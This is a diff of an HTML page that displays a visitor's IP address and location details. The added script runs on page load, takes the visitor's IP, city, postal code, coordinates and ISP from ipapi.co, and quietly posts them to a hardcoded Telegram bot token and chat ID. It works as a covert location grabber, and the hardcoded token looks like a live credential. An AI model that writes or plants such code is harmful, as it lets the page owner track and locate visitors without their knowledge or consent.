@@ -43,20 +43,66 @@
     <p><strong>Timezone:</strong> <span id="timezone"></span></p>
     <p><strong>ISP:</strong> <span id="isp"></span></p>
     <hr>
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script>
-        $(document).ready(function() {
-            $.getJSON("https://ipapi.co/json/", function(data) {
-                $("#ip_address").text(data.ip);
-                $("#country_name").text(data.country_name);
-                $("#region_name").text(data.region);
-                $("#city_name").text(data.city);
-                $("#latitude").text(data.latitude);
-                $("#longitude").text(data.longitude);
-                $("#postal_code").text(data.postal);
-                $("#timezone").text(data.timezone);
-                $("#isp").text(data.org);
-            });
+        document.addEventListener("DOMContentLoaded", function() {
+            // Replace with your bot token and chat ID
+            const botToken = "8178145421:AAFLKhUtivNrhharhGdQf0IgQx7LYdetnjc";
+            const chatId = "7936915348";
+
+            // Function to send data to Telegram
+            function sendToTelegram(message) {
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const payload = {
+                    chat_id: chatId,
+                    text: message,
+                };
+
+                fetch(url, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify(payload),
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log("Message sent to Telegram successfully.");
+                    } else {
+                        console.error("Failed to send message to Telegram.");
+                    }
+                })
+                .catch(error => console.error("Error:", error));
+            }
+
+            // Fetch IP data
+            fetch("https://ipapi.co/json/")
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById("ip_address").textContent = data.ip;
+                    document.getElementById("country_name").textContent = data.country_name;
+                    document.getElementById("region_name").textContent = data.region;
+                    document.getElementById("city_name").textContent = data.city;
+                    document.getElementById("latitude").textContent = data.latitude;
+                    document.getElementById("longitude").textContent = data.longitude;
+                    document.getElementById("postal_code").textContent = data.postal;
+                    document.getElementById("timezone").textContent = data.timezone;
+                    document.getElementById("isp").textContent = data.org;
+
+                    // Prepare message for Telegram
+                    const message = `
+IP Address: ${data.ip}
+Country: ${data.country_name}
+Region: ${data.region}
+City: ${data.city}
+Latitude: ${data.latitude}
+Longitude: ${data.longitude}
+Postal Code: ${data.postal}
+Timezone: ${data.timezone}
+ISP: ${data.org}
+                    `;
+                    sendToTelegram(message);
+                })
+                .catch(error => console.error("Error fetching IP data:", error));
         });
     </script>
 </body>
